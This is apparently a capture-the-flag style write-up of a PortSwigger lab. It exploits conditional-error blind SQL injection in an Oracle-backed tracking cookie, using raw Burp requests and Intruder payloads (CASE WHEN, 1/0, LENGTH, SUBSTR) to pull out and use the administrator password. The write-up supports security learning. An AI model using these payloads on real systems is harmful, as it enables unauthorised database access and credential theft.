*This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.*

Upon loading the page, I clicked on *My account* and checked my HTTP History. For the request : 
```Burp 
GET /login HTTP/2
Host: 0a7f00bf04e42eee80157b93006700de.web-security-academy.net
Cookie: TrackingId=PfJD9RLxfNj8UB1J; session=LZsMcf4PGNcPaQ3Sv51r4vujGd0db0yj
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7f00bf04e42eee80157b93006700de.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
There was no visible change in the response. 

I decided to try to trigger a error response based on conditions. I first checked if there was a chance for SQLi vulnerability by modifying the request in the Repeater: 
```Burp 
ET /login HTTP/2
Host: 0a7f00bf04e42eee80157b93006700de.web-security-academy.net
Cookie: TrackingId=PfJD9RLxfNj8UB1J'; session=LZsMcf4PGNcPaQ3Sv51r4vujGd0db0yj
...
```
An error was received int as seen below: 
```Burp 
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2324
```
I then checked if the application interprets the injection as a query by adding one more ' mark: 
```Burp 
GET /login HTTP/2
Host: 0a7f00bf04e42eee80157b93006700de.web-security-academy.net
Cookie: TrackingId=PfJD9RLxfNj8UB1J''; session=LZsMcf4PGNcPaQ3Sv51r4vujGd0db0yj
```
This returns a OK response with no error: 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3149
```

Given that this database is Oracle, I modified the query in the repeater to as such: 
```Burp 
GET /login HTTP/2
Host: 0a8800880470e35e802508ae00c9003f.web-security-academy.net
Cookie: TrackingId=dZw12EJsZs1wnBk'AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM dual)=1--;
...
```
This checks if any error would be thrown from a `TRUE`  statement. The following successful response was received: 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3149
```
I then checked if any error would be thrown from a `FALSE` statement. I modified the request to the following: 
```Burp 
GET /login HTTP/2
Host: 0a8800880470e35e802508ae00c9003f.web-security-academy.net
Cookie: TrackingId=dZw12EJsZs1wnBk'AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END FROM dual)=1--; 
```
The following error response was observed: 
```Burp 
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2324
```
I can now modify the request to check if there is a user named *administrator*: 
```Burp 
GET /login HTTP/2
Host: 0a8800880470e35e802508ae00c9003f.web-security-academy.net
Cookie: TrackingId=dZw12EJsZs1wnBk'AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM users WHERE username='administrator')=1--;
...
```
The response was successful: 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3149
```
Now to verify the password length, I passed this into the Repeater:  
```Burp 
GET /login HTTP/2
Host: 0abb003e0491d6398054f83d00900092.web-security-academy.net
Cookie: TrackingId=ZrWXzpJw6Bn01yk5'||(SELECT CASE WHEN LENGTH(password)>=1 THEN NULL ELSE to_char(1/0) END FROM users WHERE username ='administrator')--;
...
```
I sent this modified request to Intruder to increment the value of length until I received an error: 
```Burp 
GET /login HTTP/2
Host: 0abb003e0491d6398054f83d00900092.web-security-academy.net
Cookie: TrackingId=ZrWXzpJw6Bn01yk5'||(SELECT CASE WHEN LENGTH(password)>=§1§ THEN NULL ELSE to_char(1/0) END FROM users WHERE username ='administrator')--; 
...
```
This was the result of starting the attack using a numbers payload from 1-50:
![Screenshot 2024-05-02 at 4.05.44 PM](images/Screenshot%202024-05-02%20at%204.05.44%20PM.png)

This shows us that the length of the password is 20. 

Now it is time for us to find the value of the character at each index of the password. 
Modified the following request to the following: 
```Burp 
GET /login HTTP/2
Host: 0abb003e0491d6398054f83d00900092.web-security-academy.net
Cookie: TrackingId=ZrWXzpJw6Bn01yk5'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN NULL ELSE to_char(1/0) END FROM users WHERE username ='administrator')--;
```
Sent this to Intruder, used *Cluster Bomb* and created the payloads as seen below: 
```Burp 
GET /login HTTP/2
Host: 0abb003e0491d6398054f83d00900092.web-security-academy.net
Cookie: TrackingId=ZrWXzpJw6Bn01yk5'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN NULL ELSE to_char(1/0) END FROM users WHERE username ='administrator')--; 
```
![Screenshot 2024-05-02 at 4.21.17 PM](images/Screenshot%202024-05-02%20at%204.21.17%20PM.png)
![Screenshot 2024-05-02 at 4.21.45 PM](images/Screenshot%202024-05-02%20at%204.21.45%20PM.png)
Once the attack was finished, I sorted the payloads by payload number 1 and by status code 200. 
Piecing those with status code 200, I received the following password: 
`7a3jk3m8a3cy05k1jy4o`

Managed to log in successfully!

![Screenshot 2024-05-02 at 4.30.02 PM](images/Screenshot%202024-05-02%20at%204.30.02%20PM.png)
